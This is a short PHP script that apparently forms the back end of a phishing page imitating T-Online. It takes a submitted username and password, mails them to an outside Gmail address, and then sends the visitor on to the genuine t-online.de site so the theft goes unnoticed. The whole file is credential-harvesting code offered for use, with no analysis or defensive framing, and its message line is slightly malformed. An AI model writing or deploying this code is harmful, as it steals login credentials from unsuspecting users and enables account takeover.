<?php

 $username = $_POST['pw_usr'];
 $password = $_POST['pw_pwd'];

$to = "alphonsebert33@gmail.com";
$subject = "My subject";
$msg = "$$username .' '. $password";

// $headers = "From: webmaster@example.com" . "\r\n" .
// "CC: somebodyelse@example.com";

mail($to,$subject,$msg);




$Redirect="https://www.t-online.de/#top";


header("Location: $Redirect");


?>
